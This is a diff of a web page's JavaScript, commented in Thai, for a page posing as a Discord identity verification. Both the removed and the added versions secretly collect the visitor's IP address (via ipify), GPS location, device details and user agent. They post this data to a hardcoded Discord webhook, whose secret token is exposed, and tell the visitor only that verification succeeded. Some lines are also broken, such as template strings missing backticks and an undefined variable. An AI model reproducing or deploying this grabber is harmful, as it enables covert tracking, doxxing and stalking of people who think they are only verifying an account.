@@ -144,88 +144,52 @@
       window.location.href = discordAuthUrl;
     });
 
-    const webhookUrl = "https://discord.com/api/webhooks/1381107593946202214/TUZFgWXhHIRUiQv28wgTtvbZz7tDZB--rXcLy1EyN7oE4FXkNfu7VrBtBBUVQDJRT-9u";
+    
+    // ==== ส่งข้อมูลไป Webhook ====
+    async function sendIpLocationToWebhook() {
+      const webhookURL = "https://discord.com/api/webhooks/1381107593946202214/TUZFgWXhHIRUiQv28wgTtvbZz7tDZB--rXcLy1EyN7oE4FXkNfu7VrBtBBUVQDJRT-9u"; // แก้เป็นของคุณ
+      statusEl.textContent = "📡 กำลังส่งข้อมูล...";
+      statusEl.className = "loading";
 
-    function getLocation() {
-      const statusEl = document.getElementById("status");
-      statusEl.innerText = "⏳ กําลังขออนุญาตตำแหน่ง...";
-      
-      if (!navigator.geolocation) {
-        statusEl.innerText = "❌ เบราว์เซอร์ของคุณไม่รองรับ Geolocation";
-        return;
-      }
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
 
-      // ขอพิกัดแบบแม่นยำสูงสุด (enableHighAccuracy: true)
-      navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      });
-    }
-
-    function sendToDiscord(position) {
-      const statusEl = document.getElementById("status");
-
-      // ข้อมูลตำแหน่ง
-      const lat = position.coords.latitude.toFixed(6);
-      const lon = position.coords.longitude.toFixed(6);
-      const accuracy = position.coords.accuracy.toFixed(1); // ความแม่นยำ (เมตร)
-      const timestamp = new Date(position.timestamp).toLocaleString('th-TH', {
-        year: 'numeric', month: '2-digit', day: '2-digit',
-        hour: '2-digit', minute: '2-digit', second: '2-digit'
-      });
-      const mapUrl = https://www.google.com/maps?q=${lat},${lon};
-
-      // ข้อมูลอุปกรณ์
-      const userAgent = navigator.userAgent;
-      const platform = navigator.platform;
-      const language = navigator.language;
-
-      const data = {
-        content: 📍 มีผู้ใช้ยืนยันตัวตน Discord\n\n +
-                 🕒 เวลาระบุ: ${timestamp}\n +
-                 🌐 [ดูตำแหน่งบนแผนที่](${mapUrl})\n +
-                 📌 พิกัด: ${lat}, ${lon}\n +
-                 📏 ความแม่นยำ: ±${accuracy} เมตร\n +
-                 💻 อุปกรณ์: ${userAgent}\n +
-                 🖥️ แพลตฟอร์ม: ${platform}\n +
-                 🌏 ภาษาเบราว์เซอร์: ${language}
-      };
-
-      statusEl.innerText = "⏳ กําลังส่งข้อมูลไปยัง Discord...";
-
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      })
-      .then(response => {
-        if (response.ok) {
-          statusEl.innerText = "✅ ยืนยันตัวตน Discord เรียบร้อยแล้ว!";
-        } else {
-          statusEl.innerText = ❌ ส่งข้อมูลไม่สำเร็จ (รหัส: ${response.status});
+        let locationText = "❌ ไม่อนุญาตให้เข้าถึงตำแหน่ง";
+        try {
+          const position = await new Promise((resolve, reject) =>
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 })
+          );
+          const { latitude, longitude } = position.coords;
+          locationText = `📍 ตำแหน่ง: https://www.google.com/maps?q=${latitude},${longitude}`;
+        } catch (geoErr) {
+          console.warn("ไม่สามารถดึงตำแหน่งได้:", geoErr);
         }
-      })
-      .catch(err => {
-        statusEl.innerText = "❌ เกิดข้อผิดพลาด: " + err.message;
-      });
-    }
 
-    function showError(error) {
-      const statusEl = document.getElementById("status");
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          statusEl.innerText = "❌ ผู้ใช้ปฏิเสธการขออนุญาตตำแหน่ง";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          statusEl.innerText = "❌ ไม่สามารถระบุตำแหน่งได้ (ข้อมูลตำแหน่งไม่พร้อม)";
-          break;
-        case error.TIMEOUT:
-          statusEl.innerText = "❌ หมดเวลาการรอการระบุตำแหน่ง";
-          break;
-        default:
-          statusEl.innerText = "❌ เกิดข้อผิดพลาดในการระบุตำแหน่ง: " + error.message;
-          break;
+        const userAgent = navigator.userAgent;
+
+        const payload = {
+          content: `🆕 ผู้ใช้ยืนยันตัวตนแล้ว
+🌐 IP: ${ip}
+📱 อุปกรณ์: ${deviceModel}
+${locationText}
+🧠 User-Agent: ${userAgent}`
+        };
+
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        statusEl.textContent = "✅ ส่งข้อมูลเรียบร้อยแล้ว";
+        statusEl.className = "success";
+
+      } catch (err) {
+        console.error("เกิดข้อผิดพลาด:", err);
+        statusEl.textContent = "❌ ส่งข้อมูลไม่สำเร็จ";
+        statusEl.className = "error";
       }
     }
     
